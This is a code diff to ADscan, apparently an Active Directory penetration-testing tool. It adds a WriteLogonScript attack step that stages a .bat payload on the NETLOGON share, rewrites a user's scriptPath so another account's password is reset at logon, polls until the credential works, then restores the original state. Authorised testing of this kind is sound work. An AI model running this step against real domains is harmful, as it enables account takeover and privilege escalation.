+    if _is_audit_mode(shell) and not non_interactive:
+        marked_target = mark_sensitive(to_label, "user")
+        marked_executor = mark_sensitive(exec_username, "user")
+        marked_next_target = mark_sensitive(next_target_label or next_target_user, "user")
+        marked_share = mark_sensitive(str(precheck_notes.get("share") or "NETLOGON"), "text")
+        marked_path = mark_sensitive(str(precheck_notes.get("path") or "\\"), "path")
+        message = Text()
+        message.append(
+            "WriteLogonScript is disruptive in audit mode.\n",
+            style="bold yellow",
+        )
+        message.append(
+            f"Execution user: {marked_executor}\n"
+            f"Logon-script target: {marked_target}\n"
+            f"Follow-up action: reset password for {marked_next_target}\n"
+            f"Staging location: {marked_share} -> {marked_path}\n\n",
+            style="bold",
+        )
+        message.append("What ADscan will do:\n", style="bold")
+        message.append(
+            " - Upload a .bat payload to the selected staging share\n"
+            " - Overwrite scriptPath on the target user\n"
+            " - Wait for the user to log on so the payload runs\n"
+            " - Attempt to restore the original scriptPath and delete the staged file once the downstream credential is confirmed\n\n",
+            style="dim",
+        )
+        message.append("Risk notes:\n", style="bold")
+        if stale_managed_script_path:
+            message.append(
+                f" - The target currently points to an older ADscan artifact "
+                f"{mark_sensitive(stale_managed_script_path, 'path')}; "
+                "ADscan will replace it and clear the stale restore baseline.\n",
+                style="dim",
+            )
+        elif previous_script_path_readable and previous_script_path:
+            message.append(
+                f" - The target already has scriptPath set to {mark_sensitive(previous_script_path, 'path')}; "
+                "ADscan will overwrite it temporarily and then restore it.\n",
+                style="dim",
+            )
+        elif previous_script_path_readable:
+            message.append(
+                " - The target currently has no scriptPath set; ADscan will add one temporarily and then clear it.\n",
+                style="dim",
+            )
+        else:
+            message.append(
+                " - ADscan could not read the existing scriptPath value; cleanup will be best-effort only.\n",
+                style="dim",
+            )
+        message.append(
+            " - If cleanup fails, the staged script or scriptPath change may remain until you remove them manually.\n",
+            style="dim",
+        )
+        print_panel(
+            message,
+            title=Text("Disruptive Operation: WriteLogonScript", style="bold yellow"),
+            border_style="yellow",
+            expand=False,
+        )
+        if not Confirm.ask("Proceed with WriteLogonScript staging?", default=False):
+            return ("blocked", {"reason": "operator_cancelled_disruptive_writelogonscript"})
+
+    upload_service = SMBPathAccessService()
+    if stale_managed_script_path:
+        stale_delete_result = upload_service.delete_file(
+            target_host=target_host,
+            share_name=str(precheck_notes.get("share") or "NETLOGON").strip() or "NETLOGON",
+            file_path=_join_smb_path(str(precheck_notes.get("path") or "").strip(), stale_managed_script_path),
+            username=str(exec_username),
+            password=password,
+            auth_domain=str(domain),
+            use_kerberos=use_kerberos,
+            kdc_host=target_host if use_kerberos else None,
+        )
+        stale_managed_script_deleted = bool(stale_delete_result.success)
+        stale_managed_script_delete_error = str(stale_delete_result.error_message or "").strip()
+        if stale_managed_script_deleted:
+            print_info(
+                "WriteLogonScript removed the stale ADscan-managed payload before staging the new one."
+            )
+        elif stale_managed_script_delete_error:
+            print_info_debug(
+                "[writelogonscript] stale managed payload delete failed; continuing with unique filename: "
+                f"target={mark_sensitive(to_label, 'user')} "
+                f"path={mark_sensitive(stale_managed_script_path, 'path')} "
+                f"error={mark_sensitive(stale_managed_script_delete_error, 'text')}"
+            )
+    upload_result = upload_service.upload_file(
+        target_host=target_host,
+        share_name=str(precheck_notes.get("share") or "NETLOGON").strip() or "NETLOGON",
+        directory_path=str(precheck_notes.get("path") or "").strip(),
+        username=str(exec_username),
+        password=password,
+        auth_domain=str(domain),
+        file_contents=payload.file_contents,
+        remote_filename=payload.filename,
+        delete_after=False,
+        use_kerberos=use_kerberos,
+        kdc_host=target_host if use_kerberos else None,
+    )
+    if not upload_result.success:
+        return (
+            "failed",
+            {
+                "reason": "payload_upload_failed",
+                "user": exec_username,
+                "share": upload_result.share_name,
+                "path": upload_result.directory_path,
+                "error": upload_result.error_message or "",
+                "status_code": upload_result.status_code or "",
+            },
+        )
+    set_result = service.acl.set_user_logon_script(
+        pdc_host=target_host,
+        bloody_path=bloody_path,
+        domain=domain,
+        username=exec_username,
+        password=password,
+        target_object=target_object,
+        script_path=payload.script_path_value,
+        kerberos=use_kerberos,
+        timeout=180,
+    )
+    if not set_result.success:
+        return (
+            "failed",
+            {
+                "reason": "scriptpath_update_failed",
+                "user": exec_username,
+                "target_object": target_object,
+                "share": upload_result.share_name,
+                "path": upload_result.directory_path,
+                "uploaded_file_path": upload_result.uploaded_file_path,
+                "raw_output": set_result.raw_output or "",
+                "error": set_result.error_message or "",
+            },
+        )
+
+    return (
+        "payload_staged",
+        {
+            "reason": "writelogonscript_forcechangepassword_staged",
+            "payload_strategy": "force_change_password",
+            "user": exec_username,
+            "target_host": target_host,
+            "share": upload_result.share_name,
+            "path": upload_result.directory_path,
+            "uploaded_file_path": upload_result.uploaded_file_path,
+            "script_relative_path": payload.script_path_value,
+            "script_filename": payload.filename,
+            "scriptpath_target_object": target_object,
+            "previous_script_path": previous_script_path,
+            "previous_script_path_readable": previous_script_path_readable,
+            "previous_script_path_original": previous_script_path_original,
+            "stale_managed_script_path": stale_managed_script_path,
+            "stale_managed_script_deleted": stale_managed_script_deleted,
+            "stale_managed_script_delete_error": stale_managed_script_delete_error,
+            "scriptpath_updated": True,
+            "next_step_action": str(strategy.get("next_action") or "ForceChangePassword"),
+            "next_step_target_user": next_target_user,
+            "generated_password": selected_password,
+            "target_login_required": True,
+            "auth_mode": upload_result.auth_mode,
+            "selected_staging_candidate": str(precheck_notes.get("selected_staging_candidate") or ""),
+            "cleanup_pending": True,
+        },
+    )
+
+
+def _mark_writelogonscript_cleanup_panel(
+    *,
+    target_user: str,
+    uploaded_file_path: str,
+    target_object: str,
+    error_summary: str,
+) -> None:
+    """Render a strong operator-facing warning when cleanup could not complete."""
+    lines = [
+        "WriteLogonScript cleanup did not complete automatically.",
+        "",
+        f"Target user: {mark_sensitive(target_user or 'unknown', 'user')}",
+        f"Uploaded script: {mark_sensitive(uploaded_file_path or 'unknown', 'path')}",
+        f"Target object: {mark_sensitive(target_object or 'unknown', 'text')}",
+        "",
+        "Manual cleanup is required before closing this engagement.",
+        f"Error: {mark_sensitive(error_summary or 'unknown', 'text')}",
+    ]
+    print_panel(
+        "\n".join(lines),
+        title="Manual Cleanup Required",
+        border_style="red",
+        expand=False,
+    )
+
+
+def _poll_writelogonscript_followup_credential(
+    shell: Any,
+    *,
+    domain: str,
+    summary: dict[str, Any],
+    from_label: str,
+    to_label: str,
+    target_user: str,
+    target_password: str,
+) -> dict[str, Any]:
+    """Poll for the downstream credential created by a staged logon script.
+
+    The logon script only becomes effective once the target user logs on. This
+    helper waits in short intervals, verifies the staged password silently, and
+    preserves detailed timing/attempt metadata in the step notes so operators
+    can understand whether the path is still pending or already confirmed.
+    """
+    initial_wait_seconds = _env_int(
+        "ADSCAN_WRITELOGONSCRIPT_POLL_SECONDS",
+        60,
+        minimum=5,
+    )
+    extend_wait_seconds = _env_int(
+        "ADSCAN_WRITELOGONSCRIPT_POLL_EXTEND_SECONDS",
+        initial_wait_seconds,
+        minimum=5,
+    )
+    interval_seconds = _env_int(
+        "ADSCAN_WRITELOGONSCRIPT_POLL_INTERVAL_SECONDS",
+        5,
+        minimum=1,
+    )
+    max_extensions = _env_int(
+        "ADSCAN_WRITELOGONSCRIPT_POLL_MAX_EXTENSIONS",
+        10,
+        minimum=0,
+    )
+    auto_extend = is_non_interactive(shell) or _env_flag_enabled(
+        "ADSCAN_WRITELOGONSCRIPT_AUTO_EXTEND"
+    )
+
+    attempts = 0
+    total_wait_seconds = 0
+    current_wait_budget = initial_wait_seconds
+    extensions_used = 0
+    started_at = datetime.now(UTC)
+
+    marked_target_user = mark_sensitive(target_user, "user")
+    marked_domain = mark_sensitive(domain, "domain")
+    marked_from = mark_sensitive(from_label, "user")
+    marked_to = mark_sensitive(to_label, "user")
+    step_count = len(summary.get("steps", [])) if isinstance(summary.get("steps"), list) else 0
+    print_info(
+        "WriteLogonScript validation started: polling LDAP for "
+        f"{marked_target_user}@{marked_domain} for up to {initial_wait_seconds}s."
+    )
+    print_info_debug(
+        "[writelogonscript] polling context initialized: "
+        f"from={marked_from} to={marked_to} target={marked_target_user} "
+        f"domain={marked_domain} summary_steps={step_count}"
+    )
+
+    while True:
+        deadline = time.monotonic() + current_wait_budget
+        print_info_debug(
+            "[writelogonscript] follow-up credential polling window started: "
+            f"domain={marked_domain} target={marked_target_user} "
+            f"budget_seconds={current_wait_budget} interval_seconds={interval_seconds} "
+            f"extensions_used={extensions_used}"
+        )
+        while True:
+            attempts += 1
+            print_info_debug(
+                "[writelogonscript] polling attempt: "
+                f"domain={marked_domain} target={marked_target_user} "
+                f"attempt={attempts} waited_seconds={total_wait_seconds}"
+            )
+            verified = False
+            try:
+                verified = bool(
+                    shell.verify_domain_credentials(
+                        domain,
+                        target_user,
+                        target_password,
+                        ui_silent=True,
+                    )
+                )
+            except Exception as exc:  # noqa: BLE001
+                telemetry.capture_exception(exc)
+                print_info_debug(
+                    "[writelogonscript] follow-up verification attempt failed: "
+                    f"target={marked_target_user} error={exc}"
+                )
+            if verified:
+                detected_at = datetime.now(UTC)
+                elapsed_seconds = max(
+                    0,
+                    int((detected_at - started_at).total_seconds()),
+                )
+                print_info(
+                    "WriteLogonScript validation succeeded: "
+                    f"{marked_target_user}@{marked_domain} authenticated after {elapsed_seconds}s."
+                )
+                return {
+                    "verification_status": "confirmed",
+                    "verification_attempts": attempts,
+                    "verification_wait_seconds": elapsed_seconds,
+                    "verification_started_at": started_at.isoformat(),
+                    "verification_completed_at": detected_at.isoformat(),
+                    "verification_extensions_used": extensions_used,
+                    "target_login_required": False,
+                }
+
+            remaining_seconds = deadline - time.monotonic()
+            if remaining_seconds <= 0:
+                break
+            sleep_seconds = min(interval_seconds, max(1, int(remaining_seconds)))
+            print_info_debug(
+                "[writelogonscript] credential not active yet: "
+                f"target={marked_target_user} sleeping_seconds={sleep_seconds} "
+                f"remaining_seconds={max(0, int(remaining_seconds))}"
+            )
+            time.sleep(sleep_seconds)
+            total_wait_seconds += sleep_seconds
+
+        timeout_at = datetime.now(UTC)
+        elapsed_seconds = max(0, int((timeout_at - started_at).total_seconds()))
+        print_warning(
+            "WriteLogonScript validation is still pending: "
+            f"{marked_target_user}@{marked_domain} did not authenticate within {elapsed_seconds}s."
+        )
+        if extensions_used >= max_extensions:
+            print_info_debug(
+                "[writelogonscript] maximum polling extensions reached: "
+                f"target={marked_target_user} max_extensions={max_extensions}"
+            )
+            return {
+                "verification_status": "pending",
+                "verification_attempts": attempts,
+                "verification_wait_seconds": elapsed_seconds,
+                "verification_started_at": started_at.isoformat(),
+                "verification_completed_at": timeout_at.isoformat(),
+                "verification_extensions_used": extensions_used,
+                "target_login_required": True,
+            }
+
+        if auto_extend:
+            extensions_used += 1
+            current_wait_budget = extend_wait_seconds
+            print_info(
+                "WriteLogonScript validation extended automatically: "
+                f"waiting another {extend_wait_seconds}s for {marked_target_user}@{marked_domain}."
+            )
+            continue
+
+        if Confirm.ask(
+            f"Keep polling {marked_target_user}@{marked_domain} for another {extend_wait_seconds}s?",
+            default=True,
+        ):
+            extensions_used += 1
+            current_wait_budget = extend_wait_seconds
+            print_info(
+                "WriteLogonScript validation extended by operator: "
+                f"waiting another {extend_wait_seconds}s."
+            )
+            continue
+
+        return {
+            "verification_status": "pending",
+            "verification_attempts": attempts,
+            "verification_wait_seconds": elapsed_seconds,
+            "verification_started_at": started_at.isoformat(),
+            "verification_completed_at": timeout_at.isoformat(),
+            "verification_extensions_used": extensions_used,
+            "target_login_required": True,
+        }
+
+
+def _attempt_writelogonscript_cleanup_if_ready(
+    shell: Any,
+    *,
+    domain: str,
+    summary: dict[str, Any],
+) -> None:
+    """Cleanup staged WriteLogonScript artifacts once the downstream credential exists."""
+    from adscan_internal.services import ExploitationService
+    from adscan_internal.services.smb_path_access_service import SMBPathAccessService
+
+    steps = summary.get("steps") if isinstance(summary.get("steps"), list) else []
+    if not isinstance(steps, list):
+        return
+
+    for step in steps:
+        if not isinstance(step, dict):
+            continue
+        action = str(step.get("action") or "").strip().lower()
+        status = str(step.get("status") or "").strip().lower()
+        if action != "writelogonscript" or status not in {"attempted", "success"}:
+            continue
+        details = step.get("details") if isinstance(step.get("details"), dict) else {}
+        if not bool(details.get("cleanup_pending")):
+            continue
+        if str(details.get("payload_strategy") or "").strip().lower() != "force_change_password":
+            continue
+
+        next_target_user = str(details.get("next_step_target_user") or "").strip()
+        generated_password = str(details.get("generated_password") or "").strip()
+        if not next_target_user or not generated_password:
+            continue
+        stored_target_credential = _get_stored_domain_credential_for_user(
+            shell,
+            domain=domain,
+            username=next_target_user,
+        )
+        if stored_target_credential != generated_password:
+            continue
+
+        cleanup_user = str(details.get("user") or "").strip()
+        cleanup_password = _resolve_domain_password(shell, domain, cleanup_user)
+        target_host = str(details.get("target_host") or "").strip()
+        share_name = str(details.get("share") or "").strip()
+        uploaded_file_path = str(details.get("uploaded_file_path") or "").strip()
+        target_object = str(details.get("scriptpath_target_object") or "").strip()
+        previous_script_path = str(details.get("previous_script_path") or "").strip()
+        previous_readable = bool(details.get("previous_script_path_readable"))
+        use_kerberos = bool(
+            isinstance(getattr(shell, "domains_data", None), dict)
+            and isinstance(getattr(shell, "domains_data", {}).get(domain), dict)
+            and getattr(shell, "domains_data", {}).get(domain, {}).get("kerberos_tickets")
+        )
+        if use_kerberos:
+            use_kerberos = prepare_kerberos_ldap_environment(
+                operation_name="WriteLogonScript cleanup",
+                target_domain=domain,
+                workspace_dir=str(
+                    getattr(shell, "current_workspace_dir", "")
+                    or getattr(shell, "_get_workspace_cwd", lambda: "")()
+                    or ""
+                ),
+                username=cleanup_user,
+                user_domain=str(domain),
+                domains_data=getattr(shell, "domains_data", {}),
+                sync_clock=getattr(shell, "do_sync_clock_with_pdc", None),
+            )
+
+        cleanup_notes = dict(details)
+        cleanup_notes["cleanup_checked_at"] = datetime.now(UTC).isoformat()
+        cleanup_notes["cleanup_trigger_user"] = next_target_user
+
+        if not cleanup_user or not cleanup_password or not target_host or not share_name or not uploaded_file_path or not target_object:
+            cleanup_notes.update(
+                {
+                    "cleanup_status": "failed",
+                    "cleanup_pending": True,
+                    "cleanup_error": "Missing cleanup credential or artifact metadata.",
+                }
+            )
+            update_edge_status_by_labels(
+                shell,
+                domain,
+                from_label=str(details.get("from") or ""),
+                relation=str(step.get("action") or ""),
+                to_label=str(details.get("to") or ""),
+                status="success",
+                notes=cleanup_notes,
+            )
+            step["status"] = "success"
+            step["details"] = cleanup_notes
+            _mark_writelogonscript_cleanup_panel(
+                target_user=next_target_user,
+                uploaded_file_path=uploaded_file_path,
+                target_object=target_object,
+                error_summary="Missing cleanup credential or artifact metadata.",
+            )
+            continue
+
+        smb_service = SMBPathAccessService()
+        delete_result = smb_service.delete_file(
+            target_host=target_host,
+            share_name=share_name,
+            file_path=uploaded_file_path,
+            username=cleanup_user,
+            password=cleanup_password,
+            auth_domain=domain,
+            use_kerberos=use_kerberos,
+            kdc_host=target_host if use_kerberos else None,
+        )
+        service = ExploitationService()
+        bloody_path = str(getattr(shell, "bloodyad_path", "") or "").strip()
+        revert_success = False
+        revert_error = ""
+        if bloody_path and previous_readable:
+            revert_result = service.acl.set_user_logon_script(
+                pdc_host=target_host,
+                bloody_path=bloody_path,
+                domain=domain,
+                username=cleanup_user,
+                password=cleanup_password,
+                target_object=target_object,
+                script_path=previous_script_path if previous_script_path else None,
+                kerberos=use_kerberos,
+                timeout=180,
+            )
+            revert_success = bool(revert_result.success)
+            revert_error = str(revert_result.error_message or revert_result.raw_output or "").strip()
+        else:
+            revert_error = "Original scriptPath value was not captured; automatic revert skipped."
+
+        cleanup_ok = bool(delete_result.success and revert_success)
+        cleanup_notes.update(
+            {
+                "cleanup_pending": not cleanup_ok,
+                "cleanup_status": "success" if cleanup_ok else "failed",
+                "cleanup_completed_at": datetime.now(UTC).isoformat(),
+                "cleanup_file_deleted": bool(delete_result.success),
+                "cleanup_scriptpath_reverted": bool(revert_success),
+                "cleanup_file_error": delete_result.error_message or "",
+                "cleanup_scriptpath_error": revert_error,
+            }
+        )
+        update_edge_status_by_labels(
+            shell,
+            domain,
+            from_label=str(details.get("from") or ""),
+            relation=str(step.get("action") or ""),
+            to_label=str(details.get("to") or ""),
+            status="success",
+            notes=cleanup_notes,
+        )
+        step["status"] = "success"
+        step["details"] = cleanup_notes
+        if cleanup_ok:
+            print_info(
+                "WriteLogonScript cleanup completed: the staged script was removed and the original "
+                f"scriptPath was restored for {mark_sensitive(str(details.get('to') or ''), 'user')}."
+            )
+            continue
+        _mark_writelogonscript_cleanup_panel(
+            target_user=next_target_user,
+            uploaded_file_path=uploaded_file_path,
+            target_object=target_object,
+            error_summary=(
+                delete_result.error_message
+                or revert_error
+                or "One or more automatic cleanup operations failed."
+            ),
+        )
 
 
 def _extract_password_spray_step_metadata(
@@ -2382,6 +3711,11 @@ def execute_selected_attack_path(
             last_executable_idx=last_executable_idx,
             step_status="running",
         )
+        _attempt_writelogonscript_cleanup_if_ready(
+            shell,
+            domain=domain,
+            summary=summary,
+        )
 
         def _run_runtime_followups(
             *,
@@ -2503,6 +3837,16 @@ def execute_selected_attack_path(
                 last_executable_idx=last_executable_idx,
                 compromise_semantics=relation_support.compromise_semantics,
                 compromise_effort=relation_support.compromise_effort,
+                effective_target_basis_kind=str(
+                    summary.get("effective_target_basis_kind") or ""
+                ),
+                effective_target_basis_primary=(
+                    summary.get("effective_target_basis_primary")
+                    if isinstance(summary.get("effective_target_basis_primary"), dict)
+                    else None
+                ),
+                target_terminal_class=str(summary.get("target_terminal_class") or ""),
+                target_followup_status=str(summary.get("target_followup_status") or ""),
             )
             details = (
                 step.get("details") if isinstance(step.get("details"), dict) else {}
@@ -2762,6 +4106,333 @@ def execute_selected_attack_path(
                     if callable(followup):
                         followup(domain, target_host, exec_username, password)
                 continue
+
+            if key == "writelogonscript":
+                if not from_label or not to_label:
+                    _record_attack_path_execution_event(
+                        shell,
+                        domain=domain,
+                        summary=summary,
+                        event_stage="step_blocked",
+                        message=f"Cannot execute {action}: missing path endpoint details.",
+                        step_index=idx,
+                        total_steps=total_executable_steps,
+                        executable_step_index=executable_step_position,
+                        last_executable_idx=last_executable_idx,
+                        action=action,
+                        from_label=from_label,
+                        to_label=to_label,
+                        step_status="blocked",
+                        reason="missing_from_to_details",
+                    )
+                    print_warning(f"Cannot execute {action}: missing from/to details.")
+                    return execution_started
+
+                execution_started = True
+                _record_attack_path_execution_event(
+                    shell,
+                    domain=domain,
+                    summary=summary,
+                    event_stage="step_attempting",
+                    message=f"Attempting {action} staging-share precheck on {to_label}.",
+                    step_index=idx,
+                    total_steps=total_executable_steps,
+                    executable_step_index=executable_step_position,
+                    last_executable_idx=last_executable_idx,
+                    action=action,
+                    from_label=from_label,
+                    to_label=to_label,
+                    step_status="attempting",
+                )
+                probe_state, probe_notes = _execute_writelogonscript_precheck(
+                    shell,
+                    domain=domain,
+                    summary=summary,
+                    from_label=from_label,
+                    to_label=to_label,
+                    details=details,
+                    context_username=context_username,
+                    context_password=context_password,
+                )
+                if hasattr(shell, "_update_active_attack_graph_step_status"):
+                    shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
+                        domain=domain,
+                        status=(
+                            "attempted"
+                            if probe_state == "precheck_succeeded"
+                            else "failed"
+                            if probe_state == "failed"
+                            else "blocked"
+                        ),
+                        notes=probe_notes,
+                    )
+                else:
+                    update_edge_status_by_labels(
+                        shell,
+                        domain,
+                        from_label=from_label,
+                        relation=action,
+                        to_label=to_label,
+                        status=(
+                            "attempted"
+                            if probe_state == "precheck_succeeded"
+                            else "failed"
+                            if probe_state == "failed"
+                            else "blocked"
+                        ),
+                        notes=probe_notes,
+                    )
+                if probe_state == "blocked":
+                    _record_attack_path_execution_event(
+                        shell,
+                        domain=domain,
+                        summary=summary,
+                        event_stage="step_blocked",
+                        message=f"Cannot execute {action}: no usable execution credential context was available.",
+                        step_index=idx,
+                        total_steps=total_executable_steps,
+                        executable_step_index=executable_step_position,
+                        last_executable_idx=last_executable_idx,
+                        action=action,
+                        from_label=from_label,
+                        to_label=to_label,
+                        step_status="blocked",
+                        reason=str(probe_notes.get("reason") or "no_usable_execution_context"),
+                        actor=str(probe_notes.get("user") or ""),
+                    )
+                    print_warning(
+                        f"Cannot execute {action}: no usable execution credential context available."
+                    )
+                    return execution_started
+                if probe_state == "failed":
+                    _record_attack_path_execution_event(
+                        shell,
+                        domain=domain,
+                        summary=summary,
+                        event_stage="step_failed",
+                        message=f"{action} staging-share write precheck failed on {to_label}.",
+                        step_index=idx,
+                        total_steps=total_executable_steps,
+                        executable_step_index=executable_step_position,
+                        last_executable_idx=last_executable_idx,
+                        action=action,
+                        from_label=from_label,
+                        to_label=to_label,
+                        step_status="failed",
+                        actor=str(probe_notes.get("user") or ""),
+                        reason=str(probe_notes.get("reason") or "netlogon_write_probe_failed"),
+                    )
+                    print_warning(
+                        f"{action} precheck failed: could not upload a benign probe file to any supported staging share."
+                    )
+                    return execution_started
+
+                _record_attack_path_execution_event(
+                    shell,
+                    domain=domain,
+                    summary=summary,
+                    event_stage="step_succeeded",
+                    message=f"{action} staging-share write precheck succeeded on {to_label}.",
+                    step_index=idx,
+                    total_steps=total_executable_steps,
+                    executable_step_index=executable_step_position,
+                    last_executable_idx=last_executable_idx,
+                    action=action,
+                    from_label=from_label,
+                    to_label=to_label,
+                    step_status="attempted",
+                    actor=str(probe_notes.get("user") or ""),
+                    reason=str(probe_notes.get("reason") or "netlogon_write_probe_succeeded"),
+                )
+                strategy_state, strategy_notes = _execute_writelogonscript_force_change_password_strategy(
+                    shell,
+                    domain=domain,
+                    summary=summary,
+                    current_step_index=idx - 1,
+                    from_label=from_label,
+                    to_label=to_label,
+                    details=details,
+                    context_username=context_username,
+                    context_password=context_password,
+                    precheck_notes=probe_notes,
+                )
+                if strategy_state == "payload_staged":
+                    final_notes = dict(probe_notes)
+                    final_notes.update(strategy_notes)
+                    step["status"] = "attempted"
+                    step["details"] = final_notes
+                    if hasattr(shell, "_update_active_attack_graph_step_status"):
+                        shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
+                            domain=domain,
+                            status="attempted",
+                            notes=final_notes,
+                        )
+                    else:
+                        update_edge_status_by_labels(
+                            shell,
+                            domain,
+                            from_label=from_label,
+                            relation=action,
+                            to_label=to_label,
+                            status="attempted",
+                            notes=final_notes,
+                        )
+                    print_info(
+                        "WriteLogonScript payload staged: the script was uploaded and scriptPath was updated. "
+                        f"When {mark_sensitive(to_label, 'user')} logs on, the payload should run and reset "
+                        f"{mark_sensitive(str(strategy_notes.get('next_step_target_user') or ''), 'user')}."
+                    )
+                    validation_policy = _get_writelogonscript_lockout_policy_state(
+                        shell,
+                        domain=domain,
+                        username=str(strategy_notes.get("user") or ""),
+                        password=str(context_password or _resolve_domain_password(shell, domain, str(strategy_notes.get("user") or "")) or ""),
+                    )
+                    final_notes["validation_policy"] = validation_policy
+                    if not bool(validation_policy.get("auto_validation_safe")):
+                        final_notes.update(
+                            {
+                                "verification_status": "manual_required",
+                                "manual_validation_required": True,
+                                "target_login_required": True,
+                            }
+                        )
+                        step["status"] = "attempted"
+                        step["details"] = final_notes
+                        if hasattr(shell, "_update_active_attack_graph_step_status"):
+                            shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
+                                domain=domain,
+                                status="attempted",
+                                notes=final_notes,
+                            )
+                        else:
+                            update_edge_status_by_labels(
+                                shell,
+                                domain,
+                                from_label=from_label,
+                                relation=action,
+                                to_label=to_label,
+                                status="attempted",
+                                notes=final_notes,
+                            )
+                        register_writelogonscript_manual_validation(
+                            shell,
+                            domain=domain,
+                            username=str(strategy_notes.get("next_step_target_user") or ""),
+                            credential=str(strategy_notes.get("generated_password") or ""),
+                            summary=summary,
+                            from_label=from_label,
+                            to_label=to_label,
+                        )
+                        _render_writelogonscript_manual_validation_panel(
+                            domain=domain,
+                            target_user=str(strategy_notes.get("next_step_target_user") or ""),
+                            credential=str(strategy_notes.get("generated_password") or ""),
+                            policy_state=validation_policy,
+                        )
+                        return execution_started
+                    poll_notes = _poll_writelogonscript_followup_credential(
+                        shell,
+                        domain=domain,
+                        summary=summary,
+                        from_label=from_label,
+                        to_label=to_label,
+                        target_user=str(strategy_notes.get("next_step_target_user") or ""),
+                        target_password=str(strategy_notes.get("generated_password") or ""),
+                    )
+                    final_notes.update(poll_notes)
+                    step["status"] = (
+                        "success"
+                        if str(poll_notes.get("verification_status") or "") == "confirmed"
+                        else "attempted"
+                    )
+                    step["details"] = final_notes
+                    if hasattr(shell, "_update_active_attack_graph_step_status"):
+                        shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
+                            domain=domain,
+                            status="success"
+                            if str(poll_notes.get("verification_status") or "") == "confirmed"
+                            else "attempted",
+                            notes=final_notes,
+                        )
+                    else:
+                        update_edge_status_by_labels(
+                            shell,
+                            domain,
+                            from_label=from_label,
+                            relation=action,
+                            to_label=to_label,
+                            status="success"
+                            if str(poll_notes.get("verification_status") or "") == "confirmed"
+                            else "attempted",
+                            notes=final_notes,
+                        )
+                    if str(poll_notes.get("verification_status") or "") == "confirmed":
+                        add_credential_fn = getattr(shell, "add_credential", None)
+                        if callable(add_credential_fn):
+                            add_credential_fn(
+                                domain,
+                                str(strategy_notes.get("next_step_target_user") or ""),
+                                str(strategy_notes.get("generated_password") or ""),
+                                prompt_for_user_privs_after=False,
+                            )
+                        _attempt_writelogonscript_cleanup_if_ready(
+                            shell,
+                            domain=domain,
+                            summary=summary,
+                        )
+                    return execution_started
+                if strategy_state == "failed":
+                    final_notes = dict(probe_notes)
+                    final_notes.update(strategy_notes)
+                    if hasattr(shell, "_update_active_attack_graph_step_status"):
+                        shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
+                            domain=domain,
+                            status="failed",
+                            notes=final_notes,
+                        )
+                    else:
+                        update_edge_status_by_labels(
+                            shell,
+                            domain,
+                            from_label=from_label,
+                            relation=action,
+                            to_label=to_label,
+                            status="failed",
+                            notes=final_notes,
+                        )
+                    print_warning(
+                        "WriteLogonScript staging failed after the write precheck succeeded."
+                    )
+                    return execution_started
+                if strategy_state == "blocked":
+                    final_notes = dict(probe_notes)
+                    final_notes.update(strategy_notes)
+                    if hasattr(shell, "_update_active_attack_graph_step_status"):
+                        shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
+                            domain=domain,
+                            status="blocked",
+                            notes=final_notes,
+                        )
+                    else:
+                        update_edge_status_by_labels(
+                            shell,
+                            domain,
+                            from_label=from_label,
+                            relation=action,
+                            to_label=to_label,
+                            status="blocked",
+                            notes=final_notes,
+                        )
+                    print_warning(
+                        "WriteLogonScript payload staging was blocked."
+                    )
+                    return execution_started
+                print_info(
+                    "WriteLogonScript precheck succeeded: staging-share write was confirmed with a benign .bat probe. "
+                    "No supported follow-up payload strategy was available yet."
+                )
+                return execution_started
 
             if key in ACL_ACE_RELATIONS:
                 if not from_label or not to_label:
@@ -4838,11 +6509,7 @@ def _resolve_summary_search_mode_label(
     follow-ups get skipped for non-HV paths shown in the merged view.
     """
     if show_sections:
-        return (
-            "High-Value Search"
-            if bool(summary.get("target_is_high_value"))
-            else "Pivot Search"
-        )
+        return _summary_search_mode_label(summary)
     return default_search_mode_label
 
 
@@ -4932,22 +6599,22 @@ def offer_attack_paths_with_non_high_value_fallback(
     retry_attempted: bool = False,
     snapshot_scope: str | None = None,
 ) -> bool:
-    """Offer attack paths, with optional HV-first + fallback broadening.
+    """Offer attack paths, with optional prioritized-target fallback broadening.
 
     When ``target`` is ``"highvalue"`` (default):
-        - Shows Tier-0/high-value paths first.
+        - Shows Tier-0 or high-value paths first.
         - In ``ctf`` mode automatically broadens to all targets when none found.
         - In ``audit`` mode prompts the operator before broadening.
 
     When ``target`` is ``"all"`` or ``"lowpriv"``:
-        - Goes directly to that target mode without the HV-first prompt flow.
+        - Goes directly to that target mode without the narrowing prompt flow.
         - Intended for bounded scopes (single user, owned) where running the
           broader query is affordable.
     """
     start_norm = (start or "").strip().lower()
 
     if target != "highvalue":
-        # Direct mode — skip HV-first + fallback prompt, go straight to target.
+        # Direct mode — skip the narrowing/fallback prompt, go straight to target.
         direct_compute = _build_attack_path_summary_provider(
             shell,
             domain=domain,
@@ -4976,7 +6643,7 @@ def offer_attack_paths_with_non_high_value_fallback(
             )
             return False
         if target == "all":
-            return _offer_two_section_attack_paths(
+            return _offer_sectioned_attack_paths(
                 shell,
                 domain,
                 summaries=direct_summaries,
@@ -5161,7 +6828,7 @@ def offer_attack_paths_with_non_high_value_fallback(
     )
 
 
-def _offer_two_section_attack_paths(
+def _offer_sectioned_attack_paths(
     shell: Any,
     domain: str,
     *,
@@ -5179,25 +6846,15 @@ def _offer_two_section_attack_paths(
     snapshot_target: str = "all",
     snapshot_target_mode: str = "tier0",
 ) -> bool:
-    """Display attack paths in two sections: high-value targets first, then non-HV pivots.
+    """Display attack paths grouped Tier-0, then high-value, then pivots."""
+    merged = _sort_target_priority_groups(summaries)
 
-    HV section is shown as the primary interactive view. If the operator does not
-    execute from the HV section (or there are no HV paths), the non-HV pivot section
-    is shown as a secondary view. Returns ``True`` if any path was executed.
-    """
-    def _sort_hv_first(sums: list[dict[str, Any]]) -> list[dict[str, Any]]:
-        return [s for s in sums if s.get("target_is_high_value")] + [
-            s for s in sums if not s.get("target_is_high_value")
-        ]
-
-    merged = _sort_hv_first(summaries)
-
-    # Wrap recompute so refreshed results are also sorted HV-first.
+    # Wrap recompute so refreshed results are also re-grouped by priority class.
     _orig_recompute = recompute_summaries
 
     def _recompute_sorted() -> list[dict[str, Any]]:
         fresh = _orig_recompute() if callable(_orig_recompute) else merged
-        return _sort_hv_first(fresh)
+        return _sort_target_priority_groups(fresh)
 
